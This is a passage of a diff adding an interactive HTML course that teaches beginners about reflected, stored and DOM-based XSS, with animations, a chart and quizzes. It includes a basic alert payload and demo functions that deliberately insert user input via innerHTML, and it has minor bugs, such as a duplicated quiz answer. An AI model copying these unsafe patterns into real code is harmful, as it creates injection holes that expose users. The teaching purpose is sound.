@@ -1,0 +1,3347 @@
+<!DOCTYPE html>
+<html lang="en">
+  <script>
+    function copyCode(button) {
+      const pre = button.nextElementSibling;
+      const code = pre.querySelector("code").innerText;
+      navigator.clipboard
+        .writeText(code)
+        .then(() => {
+          button.innerText = "Copied!";
+          setTimeout(() => {
+            button.innerText = "Copy";
+          }, 1500);
+        })
+        .catch((err) => {
+          console.error("Failed to copy code: ", err);
+          button.innerText = "Error";
+        });
+    }
+
+    function checkAnswer(quizName) {
+        const selectedOption = document.querySelector(
+          `input[name="${quizName}"]:checked`
+        );
+        const feedbackElement = document.getElementById(`${quizName}-feedback`);
+        const checkButton = document.querySelector(
+          `button[onclick="checkAnswer('${quizName}')"]`
+        );
+
+        if (selectedOption) {
+          if (selectedOption.value === "correct") {
+            feedbackElement.innerText = "Correct!";
+            feedbackElement.className = "mt-2 text-green-600";
+            const section = selectedOption.closest("section");
+            if (section) {
+              markSectionComplete(section.id);
+            }
+          } else {
+            feedbackElement.innerText = "Incorrect. Please try again.";
+            feedbackElement.className = "mt-2 text-red-600";
+          }
+          feedbackElement.classList.remove("hidden");
+          checkButton.disabled = true;
+        } else {
+          feedbackElement.innerText = "Please select an answer.";
+          feedbackElement.className = "mt-2 text-yellow-600";
+          feedbackElement.classList.remove("hidden");
+        }
+      }
+
+    function testXSS() {
+        const input = document.getElementById("xss-test-input").value;
+        const outputDiv = document.getElementById("xss-test-output");
+        outputDiv.innerHTML = input; // In a real scenario, this would be a vulnerability
+      }
+
+      function showTab(tabId) {
+        const tabContents = document.querySelectorAll(".tab-content");
+        const tabButtons = document.querySelectorAll(
+          "#xss-types-tabs .tab-button"
+        );
+
+        tabContents.forEach((content) => content.classList.remove("active"));
+        tabButtons.forEach((button) =>
+          button.classList
+            .remove("bg-white", "border-b", "text-blue-600")
+            .add("bg-gray-100", "text-gray-600")
+        );
+
+        const selectedTab = document.getElementById(tabId);
+        const selectedButton = Array.from(tabButtons).find((button) =>
+          button.getAttribute("onclick").includes(`'${tabId}'`)
+        );
+
+        if (selectedTab) {
+          selectedTab.classList.add("active");
+        }
+        if (selectedButton) {
+          selectedButton.classList
+            .remove("bg-gray-100", "text-gray-600")
+            .add("bg-white", "border-b", "text-blue-600");
+        }
+      }
+
+    document.addEventListener("DOMContentLoaded", () => {
+      // --- Utility Functions ---
+
+      function toggleSection(sectionId, iconId) {
+        const sectionContent = document.getElementById(sectionId);
+        const icon = document.getElementById(iconId);
+        if (sectionContent) {
+          sectionContent.classList.toggle("active");
+          if (icon) {
+            icon.classList.toggle("rotate-180");
+          }
+        }
+        updateCourseProgress();
+      }
+
+      
+
+      function checkAnswer(quizName) {
+        const selectedOption = document.querySelector(
+          `input[name="${quizName}"]:checked`
+        );
+        const feedbackElement = document.getElementById(`${quizName}-feedback`);
+        const checkButton = document.querySelector(
+          `button[onclick="checkAnswer('${quizName}')"]`
+        );
+
+        if (selectedOption) {
+          if (selectedOption.value === "correct") {
+            feedbackElement.innerText = "Correct!";
+            feedbackElement.className = "mt-2 text-green-600";
+            const section = selectedOption.closest("section");
+            if (section) {
+              markSectionComplete(section.id);
+            }
+          } else {
+            feedbackElement.innerText = "Incorrect. Please try again.";
+            feedbackElement.className = "mt-2 text-red-600";
+          }
+          feedbackElement.classList.remove("hidden");
+          checkButton.disabled = true;
+        } else {
+          feedbackElement.innerText = "Please select an answer.";
+          feedbackElement.className = "mt-2 text-yellow-600";
+          feedbackElement.classList.remove("hidden");
+        }
+      }
+
+      function resetQuiz(quizName) {
+        const feedbackElement = document.getElementById(`${quizName}-feedback`);
+        const checkButton = document.querySelector(
+          `button[onclick="checkAnswer('${quizName}')"]`
+        );
+        const radioButtons = document.querySelectorAll(
+          `input[name="${quizName}"]`
+        );
+
+        radioButtons.forEach((radio) => {
+          radio.checked = false;
+        });
+        feedbackElement.classList.add("hidden");
+        feedbackElement.innerText = "";
+        checkButton.disabled = false;
+        const section = checkButton.closest("section");
+        if (section) {
+          unmarkSectionComplete(section.id);
+        }
+        updateCourseProgress();
+      }
+
+      // --- Interactive Elements ---
+     
+
+      function reflectedXSSDemo() {
+        const searchInput = document.getElementById("reflected-search").value;
+        const resultDiv = document.getElementById("reflected-result");
+        resultDiv.innerHTML = `<h2>Search results for: ${searchInput}</h2>`; // Vulnerable reflection
+      }
+
+      function storedXSSSubmit() {
+        const commentInput = document.getElementById("stored-comment").value;
+        const commentsDiv = document.getElementById("stored-comments");
+        const newComment = document.createElement("div");
+        newComment.classList.add("mb-2", "p-3", "bg-gray-100", "rounded-md");
+        newComment.innerHTML = commentInput; // Insecurely adding to the DOM
+        commentsDiv.appendChild(newComment);
+        document.getElementById("stored-comment").value = "";
+      }
+
+      function domXSSDemo() {
+        const name = document.getElementById("dom-name").value;
+        const greetingDiv = document.getElementById("dom-greeting");
+        greetingDiv.innerHTML = `Hello, ${name}!`; // Potentially vulnerable if name contains malicious code
+      }
+
+      // --- Animations ---
+      function setupReflectedXSSAnimation() {
+        const container = document.getElementById("reflected-animation");
+        container.innerHTML = ""; // Clear previous elements
+
+        const attacker = createAnimationElement("Attacker", 20, 50);
+        const victim = createAnimationElement("Victim", 80, 50);
+        const website = createAnimationElement("Website", 50, 200);
+        const maliciousLink = createAnimationElement("Malicious Link", 20, 120);
+        container.appendChild(attacker);
+        container.appendChild(victim);
+        container.appendChild(website);
+        container.appendChild(maliciousLink);
+
+        animateElement(attacker, { left: "20%", opacity: 1 }, 0);
+        animateElement(maliciousLink, { left: "30%", opacity: 1 }, 500);
+        animateArrow(attacker, maliciousLink, 1000);
+        animateElement(victim, { left: "80%", opacity: 1 }, 1500);
+        animateArrow(maliciousLink, website, 2000, "Malicious Request");
+        animateArrow(website, victim, 3000, "Response with Script");
+        highlightElement(victim, 3500);
+      }
+
+      function setupStoredXSSAnimation() {
+        const container = document.getElementById("stored-animation");
+        container.innerHTML = "";
+
+        const attacker = createAnimationElement("Attacker", 20, 50);
+        const websiteInput = createAnimationElement("Website Input", 20, 150);
+        const database = createAnimationElement("Database", 50, 250);
+        const victim = createAnimationElement("Victim", 80, 50);
+        const websiteOutput = createAnimationElement("Website Output", 80, 150);
+
+        container.appendChild(attacker);
+        container.appendChild(websiteInput);
+        container.appendChild(database);
+        container.appendChild(victim);
+        container.appendChild(websiteOutput);
+
+        animateElement(attacker, { left: "20%", opacity: 1 }, 0);
+        animateElement(websiteInput, { left: "20%", opacity: 1 }, 500);
+        animateArrow(attacker, websiteInput, 1000, "Malicious Input");
+        animateArrow(websiteInput, database, 1500, "Store Script");
+        animateElement(victim, { left: "80%", opacity: 1 }, 2000);
+        animateArrow(victim, websiteOutput, 2500, "Request Page");
+        animateArrow(database, websiteOutput, 3000, "Data with Script");
+        animateArrow(websiteOutput, victim, 3500, "Response");
+        highlightElement(victim, 4000);
+      }
+
+      function setupDOMXSSAnimation() {
+        const container = document.getElementById("dom-animation");
+        container.innerHTML = "";
+
+        const attacker = createAnimationElement("Attacker", 20, 50);
+        const maliciousURL = createAnimationElement("Malicious URL", 20, 150);
+        const victim = createAnimationElement("Victim", 80, 50);
+        const browser = createAnimationElement(
+          "Browser (Client-Side JS)",
+          80,
+          150,
+          180
+        );
+        const dom = createAnimationElement("DOM", 80, 250, 180);
+
+        container.appendChild(attacker);
+        container.appendChild(maliciousURL);
+        container.appendChild(victim);
+        container.appendChild(browser);
+        container.appendChild(dom);
+
+        animateElement(attacker, { left: "20%", opacity: 1 }, 0);
+        animateElement(maliciousURL, { left: "20%", opacity: 1 }, 500);
+        animateArrow(attacker, maliciousURL, 1000, "Crafted URL");
+        animateElement(victim, { left: "80%", opacity: 1 }, 1500);
+        animateArrow(maliciousURL, victim, 2000, "Visit URL");
+        animateArrow(victim, browser, 2500, "Process URL");
+        animateArrow(browser, dom, 3000, "Modify DOM");
+        highlightElement(victim, 3500);
+      }
+
+      function createAnimationElement(
+        text,
+        leftPercent,
+        topPercent,
+        zIndex = 10
+      ) {
+        const element = document.createElement("div");
+        element.classList.add(
+          "animation-element",
+          "bg-blue-200",
+          "border",
+          "border-blue-400",
+          "text-blue-800",
+          "p-2",
+          "rounded-md",
+          "text-center"
+        );
+        element.innerText = text;
+        element.style.left = `${leftPercent}%`;
+        element.style.top = `${topPercent}px`;
+        element.style.opacity = 0;
+        element.style.zIndex = zIndex;
+        return element;
+      }
+
+      function animateElement(element, properties, delay) {
+        setTimeout(() => {
+          Object.assign(element.style, properties);
+        }, delay);
+      }
+
+      function animateArrow(fromElement, toElement, delay, text = "") {
+        setTimeout(() => {
+          const fromRect = fromElement.getBoundingClientRect();
+          const toRect = toElement.getBoundingClientRect();
+          const containerRect = fromElement.parentNode.getBoundingClientRect();
+
+          const startX = fromRect.right - containerRect.left;
+          const startY = fromRect.top + fromRect.height / 2 - containerRect.top;
+          const endX = toRect.left - containerRect.left;
+          const endY = toRect.top + toRect.height / 2 - containerRect.top;
+
+          const distance = Math.sqrt(
+            Math.pow(endX - startX, 2) + Math.pow(endY - startY, 2)
+          );
+          const angle = Math.atan2(endY - startY, endX - startX);
+
+          const arrow = document.createElement("div");
+          arrow.classList.add("arrow");
+          arrow.style.width = `${distance}px`;
+          arrow.style.left = `${startX}px`;
+          arrow.style.top = `${startY - 1}px`;
+          arrow.style.transform = `rotate(${angle}rad)`;
+          fromElement.parentNode.appendChild(arrow);
+
+          if (text) {
+            const label = document.createElement("span");
+            label.innerText = text;
+            label.classList.add(
+              "absolute",
+              "text-sm",
+              "bg-white",
+              "p-1",
+              "rounded"
+            );
+            label.style.left = `${
+              (startX + endX) / 2 - label.offsetWidth / 2
+            }px`;
+            label.style.top = `${
+              (startY + endY) / 2 - label.offsetHeight - 5
+            }px`;
+            fromElement.parentNode.appendChild(label);
+            setTimeout(() => {
+              label.remove();
+            }, 2000);
+          }
+
+          setTimeout(() => {
+            arrow.remove();
+          }, 2000);
+        }, delay);
+      }
+
+      function highlightElement(element, delay) {
+        setTimeout(() => {
+          element.classList.add("highlight");
+          setTimeout(() => {
+            element.classList.remove("highlight");
+          }, 2000);
+        }, delay);
+      }
+
+      // --- Course Progress ---
+      const completedSections = new Set();
+
+      function markSectionComplete(sectionId) {
+        completedSections.add(sectionId);
+        const link = document.querySelector(`nav a[href="#${sectionId}"]`);
+        if (link) {
+          link.classList.add("text-green-500", "line-through");
+        }
+        updateCourseProgress();
+      }
+
+      function unmarkSectionComplete(sectionId) {
+        completedSections.delete(sectionId);
+        const link = document.querySelector(`nav a[href="#${sectionId}"]`);
+        if (link) {
+          link.classList.remove("text-green-500", "line-through");
+        }
+        updateCourseProgress();
+      }
+
+      function updateCourseProgress() {
+        const totalSections =
+          document.querySelectorAll(".section-header").length;
+        const completed = document.querySelectorAll(
+          '.quiz-option input[value="correct"]:checked'
+        ).length;
+        const progressPercentage =
+          totalSections > 0 ? (completed / totalSections) * 100 : 0;
+        const progressBar = document.getElementById("course-progress");
+        const progressText = document.getElementById("progress-percentage");
+
+        progressBar.style.width = `${progressPercentage}%`;
+        progressText.innerText = `${Math.round(progressPercentage)}%`;
+      }
+
+      // --- Chart ---
+      const xssImpactChartCtx = document
+        .getElementById("xssImpactChart")
+        .getContext("2d");
+      const xssImpactChart = new Chart(xssImpactChartCtx, {
+        type: "bar",
+        data: {
+          labels: [
+            "Account Takeover",
+            "Data Theft",
+            "Website Defacement",
+            "Malware Distribution",
+            "Phishing",
+          ],
+          datasets: [
+            {
+              label: "Potential Impact Severity",
+              data: [9, 8, 6, 7, 8],
+              backgroundColor: [
+                "rgba(255, 99, 132, 0.6)",
+                "rgba(54, 162, 235, 0.6)",
+                "rgba(255, 206, 86, 0.6)",
+                "rgba(75, 192, 192, 0.6)",
+                "rgba(153, 102, 255, 0.6)",
+              ],
+              borderColor: [
+                "rgba(255, 99, 132, 1)",
+                "rgba(54, 162, 235, 1)",
+                "rgba(255, 206, 86, 1)",
+                "rgba(75, 192, 192, 1)",
+                "rgba(153, 102, 255, 1)",
+              ],
+              borderWidth: 1,
+            },
+          ],
+        },
+        options: {
+          scales: {
+            y: {
+              beginAtZero: true,
+              max: 10,
+              title: {
+                display: true,
+                text: "Severity (1-10)",
+              },
+            },
+            x: {
+              title: {
+                display: true,
+                text: "Impact Type",
+              },
+            },
+          },
+          plugins: {
+            title: {
+              display: true,
+              text: "Potential Impact of XSS Attacks",
+              font: {
+                size: 16,
+              },
+            },
+            legend: {
+              display: false,
+            },
+          },
+        },
+      });
+
+      // --- Initialize Animations ---
+      setupReflectedXSSAnimation();
+      setupStoredXSSAnimation();
+      setupDOMXSSAnimation();
+      updateCourseProgress();
+    });
+  </script>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>XSS (Cross-Site Scripting) Interactive Course</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"
+      rel="stylesheet"
+    />
+    <link
+      href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism-okaidia.min.css"
+      rel="stylesheet"
+    />
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-javascript.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-html.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@3.9.1/dist/chart.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/d3@7.8.5/dist/d3.min.js"></script>
+    <style>
+      .code-block {
+        position: relative;
+      }
+      .copy-button {
+        position: absolute;
+        top: 5px;
+        right: 5px;
+        padding: 4px 8px;
+        font-size: 12px;
+      }
+      .section-content {
+        max-height: 0;
+        overflow: hidden;
+        transition: max-height 0.5s ease-out;
+      }
+      .section-content.active {
+        max-height: 5000px;
+      }
+      .tab-content {
+        display: none;
+      }
+      .tab-content.active {
+        display: block;
+      }
+      .animation-container {
+        position: relative;
+        height: 300px;
+        border: 1px solid #ccc;
+        margin: 20px 0;
+        overflow: hidden;
+      }
+      .animation-element {
+        position: absolute;
+        transition: all 1s ease;
+      }
+      .arrow {
+        position: absolute;
+        height: 2px;
+        background-color: #3b82f6;
+        transform-origin: left;
+      }
+      .arrow::after {
+        content: "";
+        position: absolute;
+        height: 10px;
+        width: 10px;
+        right: -5px;
+        top: -4px;
+        border-style: solid;
+        border-width: 5px 0 5px 8px;
+        border-color: transparent transparent transparent #3b82f6;
+      }
+      .highlight {
+        animation: highlight 1s ease-in-out;
+      }
+      @keyframes highlight {
+        0%,
+        100% {
+          background-color: transparent;
+        }
+        50% {
+          background-color: rgba(59, 130, 246, 0.2);
+        }
+      }
+      .checkpoint-item {
+        position: relative;
+        padding-left: 30px;
+        margin-bottom: 15px;
+      }
+      .checkpoint-item::before {
+        content: "";
+        position: absolute;
+        left: 0;
+        top: 5px;
+        width: 20px;
+        height: 20px;
+        border-radius: 50%;
+        background-color: #e5e7eb;
+        z-index: 1;
+      }
+      .checkpoint-item.completed::before {
+        background-color: #10b981;
+      }
+      .checkpoint-item::after {
+        content: "";
+        position: absolute;
+        left: 10px;
+        top: 25px;
+        width: 2px;
+        height: calc(100% - 10px);
+        background-color: #e5e7eb;
+        z-index: 0;
+      }
+      .checkpoint-item:last-child::after {
+        display: none;
+      }
+      .tooltip {
+        position: relative;
+      }
+      .tooltip .tooltip-text {
+        visibility: hidden;
+        width: 200px;
+        background-color: #333;
+        color: #fff;
+        text-align: center;
+        border-radius: 6px;
+        padding: 5px;
+        position: absolute;
+        z-index: 1;
+        bottom: 125%;
+        left: 50%;
+        margin-left: -100px;
+        opacity: 0;
+        transition: opacity 0.3s;
+      }
+      .tooltip:hover .tooltip-text {
+        visibility: visible;
+        opacity: 1;
+      }
+      .progress-bar-container {
+        width: 100%;
+        height: 20px;
+        background-color: #e5e7eb;
+        border-radius: 10px;
+        overflow: hidden;
+        margin: 10px 0;
+      }
+      .progress-bar {
+        height: 100%;
+        background-color: #10b981;
+        transition: width 0.5s ease;
+      }
+    </style>
+  </head>
+  <body class="bg-gray-100 font-sans">
+    <div class="container mx-auto px-4 py-8 max-w-5xl">
+      <header class="mb-12 text-center">
+        <h1 class="text-4xl font-bold text-blue-700 mb-4">
+          XSS (Cross-Site Scripting) Interactive Course
+        </h1>
+        <p class="text-xl text-gray-600">
+          A comprehensive guide for beginner cybersecurity enthusiasts
+        </p>
+
+        <div class="flex justify-center mt-8 mb-4">
+          <div class="w-full max-w-4xl">
+            <div class="progress-bar-container">
+              <div
+                id="course-progress"
+                class="progress-bar"
+                style="width: 0%"
+              ></div>
+            </div>
+            <p class="text-sm text-gray-500">
+              Course Progress: <span id="progress-percentage">0%</span>
+            </p>
+          </div>
+        </div>
+      </header>
+
+      <div class="bg-white rounded-lg shadow-md p-6 mb-8">
+        <h2 class="text-2xl font-bold text-blue-600 mb-4">Table of Contents</h2>
+        <nav class="space-y-2">
+          <a
+            href="#introduction"
+            class="block text-blue-500 hover:text-blue-700 hover:underline"
+            >1. Introduction to XSS</a
+          >
+          <a
+            href="#xss-types"
+            class="block text-blue-500 hover:text-blue-700 hover:underline"
+            >2. The 3 Main Types of XSS</a
+          >
+          <a
+            href="#reflected-xss"
+            class="block text-blue-500 hover:text-blue-700 hover:underline ml-5"
+            >2.1 Reflected XSS</a
+          >
+          <a
+            href="#stored-xss"
+            class="block text-blue-500 hover:text-blue-700 hover:underline ml-5"
+            >2.2 Stored XSS</a
+          >
+          <a
+            href="#dom-xss"
+            class="block text-blue-500 hover:text-blue-700 hover:underline ml-5"
+            >2.3 DOM-based XSS</a
+          >
+          <a
+            href="#real-world"
+            class="block text-blue-500 hover:text-blue-700 hover:underline"
+            >3. Real-World Bug Bounty Scenarios</a
+          >
+          <a
+            href="#exercises"
+            class="block text-blue-500 hover:text-blue-700 hover:underline"
+            >4. Interactive Exercises</a
+          >
+          <a
+            href="#prevention"
+            class="block text-blue-500 hover:text-blue-700 hover:underline"
+            >5. Prevention Techniques</a
+          >
+          <a
+            href="#additional"
+            class="block text-blue-500 hover:text-blue-700 hover:underline"
+            >6. Additional Resources</a
+          >
+        </nav>
+      </div>
+
+      <main>
+        <!-- Introduction Section -->
+        <section
+          id="introduction"
+          class="bg-white rounded-lg shadow-md p-6 mb-8"
+        >
+          <div
+            class="section-header flex justify-between items-center cursor-pointer"
+            onclick="toggleSection('intro-content')"
+          >
+            <h2 class="text-2xl font-bold text-blue-600">
+              1. Introduction to XSS
+            </h2>
+            <svg
+              class="w-6 h-6 text-blue-500 transform transition-transform"
+              id="intro-icon"
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke="currentColor"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2"
+                d="M19 9l-7 7-7-7"
+              />
+            </svg>
+          </div>
+          <div id="intro-content" class="section-content active mt-4">
+            <p class="mb-4">
+              Cross-Site Scripting (XSS) is one of the most common web
+              application security vulnerabilities. It occurs when an attacker
+              injects malicious scripts into web pages viewed by other users.
+              When a website doesn't properly validate or encode user input,
+              attackers can execute malicious JavaScript in the context of
+              victims' browsers.
+            </p>
+
+            <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
+              <div class="flex">
+                <div class="flex-shrink-0">
+                  <svg
+                    class="h-5 w-5 text-yellow-400"
+                    xmlns="http://www.w3.org/2000/svg"
+                    viewBox="0 0 20 20"
+                    fill="currentColor"
+                  >
+                    <path
+                      fill-rule="evenodd"
+                      d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9z"
+                      clip-rule="evenodd"
+                    />
+                  </svg>
+                </div>
+                <div class="ml-3">
+                  <p class="text-sm text-yellow-700">
+                    <strong>Why XSS matters:</strong> XSS attacks can lead to
+                    session hijacking, credential theft, phishing, malware
+                    injection, and defacement of websites. According to OWASP,
+                    XSS has consistently ranked in the top 10 web application
+                    security risks.
+                  </p>
+                </div>
+              </div>
+            </div>
+
+            <h3 class="text-xl font-semibold text-blue-700 mb-3">
+              XSS Impact Visualization
+            </h3>
+            <div class="mb-6">
+              <canvas id="xssImpactChart" width="400" height="200"></canvas>
+            </div>
+
+            <h3 class="text-xl font-semibold text-blue-700 mb-3">
+              Fundamentals of XSS
+            </h3>
+            <ul class="list-disc pl-6 mb-4 space-y-2">
+              <li>
+                <strong>Attack Vector:</strong> User input fields, URL
+                parameters, JSON data, and even HTTP headers
+              </li>
+              <li>
+                <strong>Attack Goal:</strong> Execute JavaScript in the context
+                of another user's browser session
+              </li>
+              <li>
+                <strong>Common Payloads:</strong> Alert boxes, cookie stealers,
+                keystroke loggers, form hijackers
+              </li>
+              <li>
+                <strong>Impact:</strong> Ranges from nuisance alerts to complete
+                account takeovers
+              </li>
+            </ul>
+
+            <h3 class="text-xl font-semibold text-blue-700 mb-3">
+              Basic XSS Payload Example
+            </h3>
+            <div class="code-block bg-gray-800 rounded-md mb-6">
+              <button
+                class="copy-button bg-blue-500 hover:bg-blue-600 text-white rounded"
+                onclick="copyCode(this)"
+              >
+                Copy
+              </button>
+              <pre><code class="language-html">&lt;script&gt;alert('XSS');&lt;/script&gt;</code></pre>
+            </div>
+
+            <div class="flex justify-center mb-6">
+              <div class="bg-gray-200 p-4 rounded-md max-w-lg">
+                <h4 class="text-center font-semibold mb-2">Try it yourself!</h4>
+                <p class="text-sm mb-2">
+                  Enter the basic XSS payload above in the input field and click
+                  "Submit" to see what happens:
+                </p>
+                <div class="flex">
+                  <input
+                    type="text"
+                    id="xss-test-input"
+                    class="flex-grow p-2 border rounded-l"
+                    placeholder="Enter your input here"
+                  />
+                  <button
+                    onclick="testXSS()"
+                    class="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded-r"
+                  >
+                    Submit
+                  </button>
+                </div>
+                <div
+                  id="xss-test-output"
+                  class="mt-2 p-2 border rounded min-h-[50px] bg-white"
+                ></div>
+              </div>
+            </div>
+
+            <div
+              class="mt-6 p-4 bg-green-50 border border-green-200 rounded-md"
+            >
+              <h3 class="text-lg font-semibold text-green-800 mb-2">
+                Knowledge Check
+              </h3>
+              <p class="mb-3">What does XSS stand for?</p>
+              <div class="space-y-2">
+                <div class="quiz-option flex items-center">
+                  <input type="radio" name="quiz1" id="q1o1" value="wrong" />
+                  <label for="q1o1" class="ml-2">Cross-Site Scripting</label>
+                </div>
+                <div class="quiz-option flex items-center">
+                  <input type="radio" name="quiz1" id="q1o2" value="wrong" />
+                  <label for="q1o2" class="ml-2">Cross-Site Scanning</label>
+                </div>
+                <div class="quiz-option flex items-center">
+                  <input type="radio" name="quiz1" id="q1o3" value="correct" />
+                  <label for="q1o3" class="ml-2">Cross-Site Scripting</label>
+                </div>
+                <div class="quiz-option flex items-center">
+                  <input type="radio" name="quiz1" id="q1o4" value="wrong" />
+                  <label for="q1o4" class="ml-2">Cross-Source Script</label>
+                </div>
+              </div>
+              <button
+                onclick="checkAnswer('quiz1')"
+                class="mt-3 bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded"
+              >
+                Check Answer
+              </button>
+              <p id="quiz1-feedback" class="mt-2 hidden"></p>
+            </div>
+          </div>
+        </section>
+
+        <!-- XSS Types Overview Section -->
+        <section id="xss-types" class="bg-white rounded-lg shadow-md p-6 mb-8">
+          <div
+            class="section-header flex justify-between items-center cursor-pointer"
+            onclick="toggleSection('types-content')"
+          >
+            <h2 class="text-2xl font-bold text-blue-600">
+              2. The 3 Main Types of XSS
+            </h2>
+            <svg
+              class="w-6 h-6 text-blue-500 transform transition-transform"
+              id="types-icon"
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke="currentColor"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2"
+                d="M19 9l-7 7-7-7"
+              />
+            </svg>
+          </div>
+          <div id="types-content" class="section-content active mt-4">
+            <p class="mb-6">
+              XSS attacks can be categorized into three main types.
+              Understanding the differences between these types is crucial for
+              both identifying vulnerabilities and implementing proper defenses.
+            </p>
+
+            <div class="overflow-x-auto mb-8">
+              <table class="min-w-full bg-white border border-gray-200">
+                <thead>
+                  <tr>
+                    <th
+                      class="py-2 px-4 border-b border-gray-200 bg-gray-100 text-left text-sm font-semibold text-gray-700"
+                    >
+                      Type
+                    </th>
+                    <th
+                      class="py-2 px-4 border-b border-gray-200 bg-gray-100 text-left text-sm font-semibold text-gray-700"
+                    >
+                      Description
+                    </th>
+                    <th
+                      class="py-2 px-4 border-b border-gray-200 bg-gray-100 text-left text-sm font-semibold text-gray-700"
+                    >
+                      Delivery Method
+                    </th>
+                    <th
+                      class="py-2 px-4 border-b border-gray-200 bg-gray-100 text-left text-sm font-semibold text-gray-700"
+                    >
+                      Persistence
+                    </th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td
+                      class="py-2 px-4 border-b border-gray-200 text-sm font-medium text-blue-600"
+                    >
+                      Reflected XSS
+                    </td>
+                    <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                      Malicious script is reflected off the web server in an
+                      error message, search result, or any response that
+                      includes user-supplied data
+                    </td>
+                    <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                      Typically through URL parameters or form submissions
+                    </td>
+                    <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                      Non-persistent (one-time)
+                    </td>
+                  </tr>
+                  <tr>
+                    <td
+                      class="py-2 px-4 border-b border-gray-200 text-sm font-medium text-blue-600"
+                    >
+                      Stored XSS
+                    </td>
+                    <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                      Malicious script is stored on the target server (e.g., in
+                      a database, message forum, comment field)
+                    </td>
+                    <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                      Via user input that gets permanently stored
+                    </td>
+                    <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                      Persistent (remains until removed)
+                    </td>
+                  </tr>
+                  <tr>
+                    <td
+                      class="py-2 px-4 border-b border-gray-200 text-sm font-medium text-blue-600"
+                    >
+                      DOM-based XSS
+                    </td>
+                    <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                      Vulnerability exists in client-side code rather than
+                      server-side code
+                    </td>
+                    <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                      Through manipulation of the DOM environment
+                    </td>
+                    <td class="py-2 px-4 border-b border-gray-200 text-sm">
+                      Typically non-persistent
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+
+            <div class="flex justify-center mb-8">
+              <div id="xss-types-tabs" class="w-full">
+                <div class="flex border-b">
+                  <button
+                    class="tab-button py-2 px-4 bg-white border-t border-l border-r rounded-t font-medium text-blue-600"
+                    onclick="showTab('reflected-tab')"
+                  >
+                    Reflected XSS
+                  </button>
+                  <button
+                    class="tab-button py-2 px-4 bg-gray-100 border-t border-l border-r rounded-t font-medium text-gray-600"
+                    onclick="showTab('stored-tab')"
+                  >
+                    Stored XSS
+                  </button>
+                  <button
+                    class="tab-button py-2 px-4 bg-gray-100 border-t border-l border-r rounded-t font-medium text-gray-600"
+                    onclick="showTab('dom-tab')"
+                  >
+                    DOM-based XSS
+                  </button>
+                </div>
+                <div class="bg-white border-l border-r border-b p-4">
+                  <div id="reflected-tab" class="tab-content active">
+                    <h3 class="text-lg font-semibold mb-2">
+                      Reflected XSS Flow
+                    </h3>
+                    <div class="animation-container" id="reflected-animation">
+                      <!-- Animation elements will be placed here by JavaScript -->
+                    </div>
+                    <div class="text-sm text-gray-600 mt-2">
+                      <p class="mb-1">
+                        1. Attacker crafts a malicious link with embedded script
+                      </p>
+                      <p class="mb-1">2. Victim clicks the malicious link</p>
+                      <p class="mb-1">
+                        3. Web server reflects the script in its response
+                      </p>
+                      <p class="mb-1">
+                        4. The script executes in the victim's browser
+                      </p>
+                    </div>
+                  </div>
+                  <div id="stored-tab" class="tab-content">
+                    <h3 class="text-lg font-semibold mb-2">Stored XSS Flow</h3>
+                    <div class="animation-container" id="stored-animation">
+                      <!-- Animation elements will be placed here by JavaScript -->
+                    </div>
+                    <div class="text-sm text-gray-600 mt-2">
+                      <p class="mb-1">
+                        1. Attacker posts malicious script to a website (e.g.,
+                        in a comment)
+                      </p>
+                      <p class="mb-1">
+                        2. Server stores the script in its database
+                      </p>
+                      <p class="mb-1">
+                        3. Victim visits the page containing the stored script
+                      </p>
+                      <p class="mb-1">
+                        4. Server delivers the content with the embedded script
+                      </p>
+                      <p class="mb-1">5. Script executes in victim's browser</p>
+                    </div>
+                  </div>
+                  <div id="dom-tab" class="tab-content">
+                    <h3 class="text-lg font-semibold mb-2">
+                      DOM-based XSS Flow
+                    </h3>
+                    <div class="animation-container" id="dom-animation">
+                      <!-- Animation elements will be placed here by JavaScript -->
+                    </div>
+                    <div class="text-sm text-gray-600 mt-2">
+                      <p class="mb-1">
+                        1. Attacker crafts a URL with malicious payload
+                      </p>
+                      <p class="mb-1">2. Victim visits the malicious URL</p>
+                      <p class="mb-1">
+                        3. Client-side JavaScript code processes data from the
+                        URL
+                      </p>
+                      <p class="mb-1">
+                        4. JavaScript modifies the DOM, inserting the payload
+                      </p>
+                      <p class="mb-1">
+                        5. Malicious script executes in the victim's browser
+                      </p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="bg-blue-50 border-l-4 border-blue-400 p-4 mb-6">
+              <div class="flex">
+                <div class="flex-shrink-0">
+                  <svg
+                    class="h-5 w-5 text-blue-400"
+                    xmlns="http://www.w3.org/2000/svg"
+                    viewBox="0 0 20 20"
+                    fill="currentColor"
+                  >
+                    <path
